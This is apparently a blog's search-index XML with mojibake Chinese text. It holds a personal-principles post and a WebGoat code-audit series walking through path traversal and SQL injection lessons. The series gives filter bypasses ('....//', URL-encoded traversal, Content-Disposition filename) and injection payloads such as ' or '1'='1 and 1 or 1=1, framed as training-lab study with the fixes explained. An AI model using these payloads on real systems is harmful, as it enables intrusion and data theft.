<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ä¸ªäººåŸåˆ™å®ªæ³•</title>
    <link href="/2099/12/31/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/"/>
    <url>/2099/12/31/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>å²è’‚èŠ¬.æŸ¯ç»´æå‡ºï¼Œä»¥åŸåˆ™ä¸ºå¯¼å‘æ˜¯ä»¥ç»ˆä¸ºå§‹æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚</p><blockquote><p>ææºåœ¨è§£è¯»æŸ¥ç†.èŠ’æ ¼æ—¶è¯´ï¼ŒèŠ’æ ¼çš„æ€ç»´æ–¹å¼è§£å†³äº†ä»–ä¸€ç›´ä»¥æ¥å›°æƒ‘çš„â€œæ„šäººèˆ¹â€å‘½é¢˜â€”â€”ä¸€ç¾¤äººåœ¨èˆ¹èˆ±é‡ŒæŒèˆµï¼Œä½†ä»–ä»¬çœ‹ä¸æ¸…å‰æ–¹ï¼›å¦ä¸€ç¾¤äººåœ¨å²¸ä¸Šï¼Œä»–ä»¬èƒ½çœ‹è§ä¸€åˆ‡ï¼Œæƒ³è¦ä¸ºèˆ¹æŒ‡å¼•æ–¹å‘ï¼Œä½†æ˜¯æ— è®ºä»–ä»¬å¦‚ä½•å«å–Šï¼Œèˆ¹é‡Œçš„äººéƒ½å¬ä¸è§ã€‚ç”Ÿæ´»å°±åƒä¸€è‰˜æ„šäººèˆ¹ï¼ŒæŒèˆµäººä»£è¡¨è¿‡å»çš„æˆ‘ä»¬ï¼Œå²¸ä¸Šçš„äººä»£è¡¨ç°åœ¨çš„æˆ‘ä»¬ã€‚ç°åœ¨æˆ‘ä»¬äº†è§£è¿‡å»ï¼Œå´æ— æ³•ä¸ºè¿‡å»çš„æˆ‘ä»¬æŒ‡å¼•æ–¹å‘ã€‚èŠ’æ ¼ä¸ä»…æ˜¯æˆåŠŸçš„æŠ•èµ„å¤§å¸ˆï¼Œæ›´æ˜¯ç”Ÿæ´»çš„æ™ºè€…ï¼Œä»–æ€»ç»“äº†ä¸€ç³»åˆ—â€œä¸ºâ€ä¸â€œä¸ä¸ºâ€çš„æ¸…å•ï¼Œä½œä¸ºè‡ªå·±çš„æŠ•èµ„åŸåˆ™ã€‚</p><p>ä½œè€…ï¼šåœŸæœˆå›<br>é“¾æ¥ï¼š<a href="https://www.jianshu.com/p/7cd520b68d5e">https://www.jianshu.com/p/7cd520b68d5e</a><br>æ¥æºï¼šç®€ä¹¦</p></blockquote><p>1.ä¿æŒå¿ è¯šï¼Œä¸å‡ºè½¨ï¼Œä¸ææš§æ˜§ï¼ŒçŸ›ç›¾å†²çªé€šè¿‡æœ‰æ•ˆæ²Ÿé€šè§£å†³ã€‚</p><p>2.ä¿æŒå†·é™ï¼Œåœ¨æ„¤æ€’çš„æ—¶å€™ï¼Œä¸å‡ºå£ä¼¤äººï¼Œä¸åŠ¨æ‰‹ä¼¤äººï¼Œä¿æŒæ·±å‘¼å¸ï¼Œç›´è‡³ç¼“è§£ã€‚</p><p>3.ä¿æŒå­¦ä¹ ï¼Œå°Šå´‡å†…å¿ƒçš„è¿½å¯»å’Œæ¢¦æƒ³ï¼Œä¸å‘ä¸äº¢ï¼Œç‹¬ç«‹æ€è€ƒã€‚</p><p>4.ä¿æŒçˆ±å¿ƒï¼Œçæƒœæ‰€æ‹¥æœ‰çš„ä¸œè¥¿ï¼Œå°½å¯èƒ½åšåˆ°èŠ‚çº¦ã€‚</p><p>5.å¼€æºèŠ‚æµï¼Œä¸èŠ±æ— æ„ä¹‰çš„é’±ï¼Œè´­ç‰©å‰éƒ½æ€è€ƒæ˜¯å¦å¿…è¦ï¼Œæ˜¯å¦å¿…é¡»ï¼Œå°½æ—©è¾¾åˆ°é€€ä¼‘å­˜æ¬¾çš„4.2%ä¸ºå¹´å¼€é”€ã€‚</p><p>6.äº«å—ç”Ÿæ´»ï¼Œäº«å—äººç”Ÿï¼Œé«˜å…‰æ—¶æœŸä¸é«˜å‚²ï¼Œä½è°·æ—¶æœŸä¸ç»æœ›ï¼Œçæƒœæ¯ä¸€å¤©ã€‚</p><p>7.ä¿æŒè‡ªä¿¡ï¼Œç›¸ä¿¡è‡ªå·±ï¼Œç›¸ä¿¡äº²è¿‘çš„äººï¼Œç›¸ä¿¡çˆ±äººã€‚</p><blockquote><p>2020/2/8 2:35 ç¬¬ä¸€ç‰ˆ</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ä¸ªäººåŸåˆ™å®ªæ³•</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WebGoatä»£ç å®¡è®¡å…¶3-è·¯å¾„ç©¿è¶Š</title>
    <link href="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/"/>
    <url>/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="Path-traversal-2"><a href="#Path-traversal-2" class="headerlink" title="Path traversal 2"></a>Path traversal 2</h2><p>è¯·æ±‚ URL: <code>http://localhost:8080/WebGoat/PathTraversal/profile-upload</code><br>è¯·æ±‚æ–¹æ³•: POST</p><p>å…¨å±€æœç´¢åæ‰¾åˆ°</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617083611.png" class=""><p>è·³å…¥ <code>ProfileUploadBase</code>ç±»ï¼Œçœ‹é‡Œé¢çš„executeå‡½æ•°</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617091146.png" class=""><p>å…ˆæ£€æŸ¥fileå’ŒfullNameæ˜¯å¦ä¸ºç©ºï¼Œç„¶åæ£€æŸ¥ä¸Šä¼ è·¯å¾„æ˜¯å¦å­˜åœ¨ã€‚æœ€åå¼€å§‹æ–°å»ºä¸Šä¼ è·¯å¾„ï¼Œåˆ›å»ºfileå¯¹è±¡å¹¶å°†ä¸Šä¼ å›¾ç‰‡å†…å®¹å¤åˆ¶åˆ°è¿™ä¸ªå¯¹è±¡é‡Œã€‚</p><p>è·ŸéšfullNameæ‰¾åˆ°ä¸‹é¢çš„<code>new File(uploadDiectory, fullName)</code></p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617092814.png" class=""><p>å¦‚æœè·¯å¾„ä¸ºç©ºå°±ä½¿ç”¨é»˜è®¤è·¯å¾„ï¼Œå¦åˆ™ä½¿ç”¨parentä¼ å…¥çš„è·¯å¾„ï¼Œparentä¸ºç©ºåˆ™ç›´æ¥ä½¿ç”¨childä¸ºè·¯å¾„ã€‚</p><p>æœ€åä¼šä½¿ç”¨attemptWasMadeå‡½æ•°æ¥æ£€æµ‹æ˜¯å¦å°è¯•äº†è·¯å¾„ç©¿è¶Š</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617093221.png" class=""><p>å…³äº<code>getCanonicalPath()</code>è¿™ä¸ªå‡½æ•°ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123; <br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;../test.txt&quot;</span>);<br>        System.out.println(file.getPath());<br>        System.out.println(file.getAbsolutePath());<br>        System.out.println(file.getCanonicalPath());<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">..<span class="hljs-symbol">\t</span>est.txt<br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>olysheep<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\j</span>ava<span class="hljs-symbol">\m</span>ain<span class="hljs-symbol">\s</span>rc<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\t</span>est.txt<br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>olysheep<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\j</span>ava<span class="hljs-symbol">\m</span>ain<span class="hljs-symbol">\t</span>est.txt<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>getAbsolutePath()</code>ä¸ä¼šå¤„ç†<code>../</code>ï¼Œè€Œ<code>getCanonicalPath()</code>ä¼šè¿”å›è§„èŒƒçš„ç»å¯¹è·¯å¾„ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆæ˜¯ä½¿ç”¨ç»å¯¹è·¯å¾„æ¥åˆ¤æ–­æ˜¯å¦è¿›è¡Œäº†è·¯å¾„ç©¿è¶Šã€‚</p><h2 id="Path-traversal-3"><a href="#Path-traversal-3" class="headerlink" title="Path traversal 3"></a>Path traversal 3</h2><p>è¯´æ˜¯ä¿®å¤äº†<code>../</code>ï¼Œè·³è¿‡å»ä¸€çœ‹</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617100420.png" class=""><p>åªæ˜¯è¿›è¡Œäº†æ›¿æ¢ï¼Œç”¨<code>....//test</code>å³å¯ç»•è¿‡</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617100606.png" class=""><h2 id="Path-traversal-4"><a href="#Path-traversal-4" class="headerlink" title="Path traversal 4"></a>Path traversal 4</h2><p>Poståˆ°<code>/WebGoat/PathTraversal/profile-upload-remove-user-input</code></p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617100953.png" class=""><p>æ”¹ä¸ºè·å–Content-Dispositionä¸­çš„fileNameï¼Œæ‰€ä»¥ä¿®æ”¹</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617102724.png" class=""><h2 id="Path-traversal-5"><a href="#Path-traversal-5" class="headerlink" title="Path traversal 5"></a>Path traversal 5</h2><p>æŠ“åŒ…åå‘ç°ï¼Œåœ¨è¯·æ±‚åŠ ä¸Š<code>?id=0</code>å¯ä»¥è·å–åˆ°è·¯å¾„å’Œå›¾ç‰‡åï¼Œç„¶åæ·»åŠ <code>../</code>ä¼šæç¤ºIllegal characters are not allowed in the query params</p><p>æŒ‰ç…§æç¤ºè¯·æ±‚<code>path-traversal-secret</code>æç¤º</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617152114.png" class=""><p>å®¡è®¡ä»£ç åå‘ç°</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617152153.png" class=""><p>ä¼šå…ˆè¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>..</code>å’Œ<code>/</code>ç„¶åå†è·å–idçš„å†…å®¹</p><p>åœ¨<code>request.getParameter()</code>é‡Œä¼šå¯¹è·å–åˆ°çš„æ•°æ®è¿›è¡Œurldecode</p><img src="/2021/06/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B63-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/image-20210617173020.png" class=""><p>æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ç§åŠæ³•è¿›è¡Œç»•è¿‡å‰é¢çš„æ£€æµ‹ï¼Œç„¶åæµ‹è¯•å¾—åˆ°æœ€ç»ˆçš„ç»“æœã€‚</p><p>é¡ºä¾¿ä¸€æï¼ŒæŸ¥æ‰¾ä¸å­˜åœ¨çš„æ–‡ä»¶æœ€ç»ˆä¼šè¿”å›çˆ¶è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ˜¯å› ä¸º<code>catPicture.getParentFile().listFiles()</code></p><h2 id="å°ç»“è§£å†³æ–¹æ¡ˆ"><a href="#å°ç»“è§£å†³æ–¹æ¡ˆ" class="headerlink" title="å°ç»“è§£å†³æ–¹æ¡ˆ"></a>å°ç»“è§£å†³æ–¹æ¡ˆ</h2><p>ä»æœ€åä¸€æ®µçš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœä½¿ç”¨getParameterå†ç”¨é»‘åå•ï¼Œå¯ä»¥é¿å…urlç¼–ç çš„ç»•è¿‡ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WebGoatä»£ç å®¡è®¡å…¶2-sqlæ³¨å…¥</title>
    <link href="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><h3 id="2-select"><a href="#2-select" class="headerlink" title="2 select"></a>2 select</h3><p>ç‚¹å‡»submitå, æŸ¥çœ‹æ•°æ®åŒ…,å‘å¾€<code>/SqlInjection/attack2</code>, è¡¨å•æ•°æ®ä¸º<code>query: select * from Employees where first_name=&#39;Bob&#39;;</code> åˆ«çš„æŸ¥è¯¢éƒ½ä¸ä¼šè¿”å›æ•°æ®.</p><p>æŸ¥çœ‹ä»£ç </p><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531101505.png" class=""><p>è®¾ç½®äº†<code>TYPE_SCROLL_INSENSITIVE</code></p><blockquote><p>The constant indicating the type for a ResultSet object that is scrollable but generally not sensitive to changes to the data that underlies the ResultSet.<br>å¯¹äºåº•å±‚æ•°æ®å˜æ¢ä¸æ•æ„Ÿ</p></blockquote><p>å’Œ<code>CONCUR_READ_ONLY</code>åªè¯».</p><p>åé¢å°±æ˜¯æŸ¥è¯¢å,åˆ¤æ–­<code>departmenté‡Œæœ‰æ²¡æœ‰Marketing</code>, æœ‰å°±åˆ¤å®šç­”å¯¹äº†.</p><p>æ‰€ä»¥æˆ‘ä»¬è¾“å…¥<code>select &#39;Marketing&#39; as department from employees;</code> ä¹Ÿå¯ä»¥è¾¾åˆ°å®Œæˆ(Doge)</p><h3 id="3-update"><a href="#3-update" class="headerlink" title="3 update"></a>3 update</h3><p>è¾“å…¥<code>update employees set department=&#39;Sales&#39; where first_name=&#39;Tobi&#39;;</code></p><p>æ‰¾<code>/SqlInjection/attack3</code></p><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531105126.png" class=""><p>å‡ ç§Statementå¯ä»¥åœ¨<a href="https://www.tutorialspoint.com/jdbc/jdbc-statements.htm#:~:text=The%20JDBC%20Statement%2C%20CallableStatement%2C%20and,types%20used%20in%20a%20database.">JDBC - Statements, PreparedStatement and CallableStatement - Tutorialspoint</a>æŸ¥çœ‹ä¸€äº›ç»†èŠ‚, æ€»çš„æ¥è¯´å°±æ˜¯ç”¨æ¥è¿æ¥æ•°æ®åº“å’Œæ‰§è¡Œsqlçš„.</p><p>statementæ‰§è¡Œ<code>executeupdate</code>å, å¦‚æœconnectionæœ€åä¸æ‰§è¡Œcommit,å¯¹æ•°æ®çš„æ›´æ”¹ä¸ä¼šè¿”å›åˆ°æ•°æ®åº“ä¸­.</p><p>æ‰€ä»¥è¾“å…¥<code>update employees set department=&#39;Sales&#39;</code>ä¹Ÿå¯ä»¥</p><h3 id="4-alter"><a href="#4-alter" class="headerlink" title="4 alter"></a>4 alter</h3><p>æäº¤æ›´æ”¹å,æŸ¥è¯¢æ˜¯å¦æœ‰phoneè¿™ä¸ªå­—æ®µ,ä¸æŠ¥é”™å°±è¿”å›æˆåŠŸ</p><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531112012.png" class=""><h3 id="5-GRANT-CREATE-TABLE-TO"><a href="#5-GRANT-CREATE-TABLE-TO" class="headerlink" title="5 GRANT CREATE TABLE TO"></a>5 GRANT CREATE TABLE TO</h3><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531112040.png" class=""><p>æ‰§è¡Œå, å†å»æŸ¥è¯¢æ˜¯å¦çœŸçš„æˆäºˆäº†æƒé™</p><h3 id="9-string-sqlæ³¨å…¥"><a href="#9-string-sqlæ³¨å…¥" class="headerlink" title="9 string sqlæ³¨å…¥"></a>9 string sqlæ³¨å…¥</h3><p>æ­£ç¡®é€‰æ‹©å,å‘é€åˆ°<code>/SqlInjection/assignment5a</code></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">account:</span> Smith<span class="hljs-comment">&#x27;</span><br><span class="hljs-symbol">operator:</span> <span class="hljs-built_in">or</span><br><span class="hljs-symbol">injection:</span> <span class="hljs-comment">&#x27;1&#x27; = &#x27;1</span><br></code></pre></td></tr></table></figure><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531113735.png" class=""><p>è¿™é‡Œçš„queryå°±æ˜¯æœ€ç»å…¸çš„sqlæ³¨å…¥å†™æ³•äº†</p><h3 id="10-Numeric-SQL-injection"><a href="#10-Numeric-SQL-injection" class="headerlink" title="10 Numeric SQL injection"></a>10 Numeric SQL injection</h3><p><code>/SqlInjection/assignment5b</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">login_count</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">userid</span>: <span class="hljs-number">1</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531114653.png" class=""><p><code>?</code>å°±æ˜¯PreparedStatementé‡Œçš„ç”¨æ³•,ä¼šå…ˆè¿›è¡Œsqlé¢„ç¼–è¯‘, å®Œæˆä¸‹å›¾çš„è§£æå’Œè§„èŒƒ, ç¼–è¯‘, ä¼˜åŒ–,ç„¶åå°†è¯­å¥å­˜åœ¨ç¼“å­˜ä¸­ç­‰å¾…è°ƒç”¨.</p><p><img src="https://3.bp.blogspot.com/-Ru6lCV80PTE/Vfb44kaVfvI/AAAAAAAAAWI/6lLFVMsbe3E/s1600/QueryExecutionPhases.png" alt=""></p><blockquote><p>å›¾è‡ª<a href="https://javabypatel.blogspot.com/2015/09/how-prepared-statement-in-java-prevents-sql-injection.html">How PreparedStatement in Java prevents SQL Injection? | JavaByPatel: Data structures and algorithms interview questions in Java</a> ä¸‹åŒ</p></blockquote><p>å½“ç”¨æˆ·æ•°æ®æ¥çš„æ—¶å€™,å°±ä¼šç›´æ¥æ›¿æ¢æ‰? è¿™é‡Œä¸å­˜åœ¨å†æ¬¡ç¼–è¯‘, æ‰€ä»¥ä¹Ÿå°±ä¸ä¼šè§£æç”¨æˆ·æ•°æ®äº†.<br><img src="https://2.bp.blogspot.com/--zpgQRL3mEc/VfcdVU-9QKI/AAAAAAAAAWY/d3xZYZcUR5g/s1600/PrepareStatement.png" alt=""></p><p>ä»£ç ä¼šå…ˆè§£æcountä¸ºæ•°å­—,ç„¶åè®¾ç½®åˆ°æŸ¥è¯¢ä¸­, ä½†æ˜¯è¿™é‡Œçš„useridè¿˜æ˜¯æ‹¼æ¥çš„so.</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p><code>/SqlInjection/attack8</code></p><p>è¡¨å•æ•°æ®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">name</span>: a<br><span class="hljs-attribute">auth_tan</span>: <span class="hljs-number">3</span>SL<span class="hljs-number">99</span>A&#x27;  or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531135812.png" class=""><p>æ‹¼æ¥æ•°æ®, åˆ¤æ–­å¤§äºå•è¡Œå°±ç®—è¿‡äº†</p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p>ä¹Ÿæ˜¯æ‹¼æ¥, ä½†æ˜¯å¯ä»¥é€šè¿‡å †å æ³¨å…¥æ‰§è¡Œé¢å¤–çš„sqlè¯­å¥.</p><p>é€šå…³æ¡ä»¶å°±æ˜¯<code>(results.getString(2).equals(&quot;John&quot;)) &amp;&amp; (results.getString(3).equals(&quot;Smith&quot;))</code></p><h2 id="advanced"><a href="#advanced" class="headerlink" title="advanced"></a>advanced</h2><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><code>/SqlInjectionAdvanced/attack6a</code></p><p>æ‹¼æ¥å‚æ•°. ä½†æ˜¯ä¼šé€šè¿‡æ­£åˆ™åŒ¹é…æ˜¯å¦æœ‰ä½¿ç”¨union<br><code>(?i)(^[^-/*;)]*)(\s*)UNION(.*$)</code></p><p>æ­£åˆ™å¯ä»¥åœ¨ <a href="https://regex101.com">https://regex101.com</a> æŸ¥çœ‹è¯¦ç»†</p><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531141826.png" class=""><p>è¦æ±‚æ˜¯ä½¿ç”¨unionå’Œ<code>output.toString().contains(&quot;dave&quot;) &amp;&amp; output.toString().contains(&quot;passW0rD&quot;)</code></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><code>/SqlInjectionAdvanced/challenge_Login</code></p><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531145305.png" class=""><p>ä¸€çœ‹å°±çŸ¥é“æ²¡æˆçš„,åªèƒ½å»è¯•è¯•æ³¨å†Œäº†<br><code>/SqlInjectionAdvanced/challenge</code></p><img src="/2021/05/31/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B62-sql%E6%B3%A8%E5%85%A5/image-20210531145643.png" class=""><p>æ³¨å†Œä¹Ÿæ˜¯æ‹¼æ¥,ä¸‹é¢åˆ«çš„åœ°æ–¹ä¹Ÿæ²¡åŠæ³•äº†,åªèƒ½åœ¨è¿™é‡Œè¿›è¡Œå †å ç„¶åæ›´æ–°tomçš„å¯†ç äº†.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WebGoatä»£ç å®¡è®¡å…¶1-ç™»å½•æ³¨å†Œ</title>
    <link href="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/"/>
    <url>/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="IDEAé…ç½®"><a href="#IDEAé…ç½®" class="headerlink" title="IDEAé…ç½®"></a>IDEAé…ç½®</h2><p>ä¸‹è½½ideaä¹‹å, webgoatè¦æ±‚</p><blockquote><p>* Java 15<br>* Maven &gt; 3.2.1<br>* Your favorite IDE<br>* Git, or Git support in your IDE</p></blockquote><p>ä½†æ˜¯è°ƒè¯•çš„è¯, åªå®‰è£…javaå³å¯</p><p>å®‰è£…å¥½åå…ˆé…ç½®Project SDKã€‚ç‚¹ä¸‹å›¾ä½ç½®, æ‰¾Project Structre, ç„¶åProject SDKé€‰æ‹©è‡ªå·±çš„java15ä½ç½®</p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528230703.png" class=""><p>ç„¶åå°±æ˜¯Run configuration, ç‚¹å‡»ä¸‹å›¾ç®­å¤´ä½ç½®ï¼Œç„¶å<code>Edit Configuration</code>,é€‰æ‹©Spring Boot,ç„¶åå¡«<code>Main class</code>å’Œ<br><code>Use classpath of module</code></p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528230936.png" class=""><blockquote><p>å¦‚æœå‡ºç°RunæŒ‰é’®ç°è‰², å¯èƒ½æ˜¯åœ¨é…ç½®/ä¸‹è½½åŒ…, å¦‚æœéƒ½å¥½äº†ä½†è¿˜æ˜¯ç°è‰², å»ºè®®å°è¯•é‡å¯idea(å€’</p></blockquote><h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><p><code>webgoat-container/src/main/java/org/owasp/webgoat/WebSecurityConfig.java</code> ä¸­ï¼Œæ”¾ç€å®‰å…¨ç›¸å…³çš„é…ç½®æ–‡ä»¶</p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528145107.png" class=""><p>èº«ä»½éªŒè¯æ²¡æœ‰ç”¨æ¡†æ¶ç»™çš„</p><blockquote><p>åé¢è°ƒè¯•çš„æ—¶å€™å‘ç°è·å–åˆ°äº†usernameå’Œpasswdä¹‹å,è¿˜æ˜¯è¿›å…¥äº†æ¡†æ¶çš„ä»£ç è¿›è¡Œåˆ¤æ–­æ˜¯å¦åŒ¹é…</p></blockquote><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528152945.png" class=""><p>ç”¨<code>command + å·¦é”®</code> å°±å¯ä»¥è·Ÿéšè·³è½¬ç›´åˆ°<code>webgoat-container/src/main/java/org/owasp/webgoat/users/UserService.java</code></p><p>è·³å›æŒ‰<code>Ctrl + alt + å·¦æ–¹å‘é”®</code></p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528155108.png" class=""><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528155720.png" class=""><p>å…¶ä¸­<code>existsByUsername</code>å’Œ<code>save</code>ï¼Œ<code>findByUsername</code>éƒ½æ˜¯<strong>UserRepository</strong>ç±»çš„</p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528155945.png" 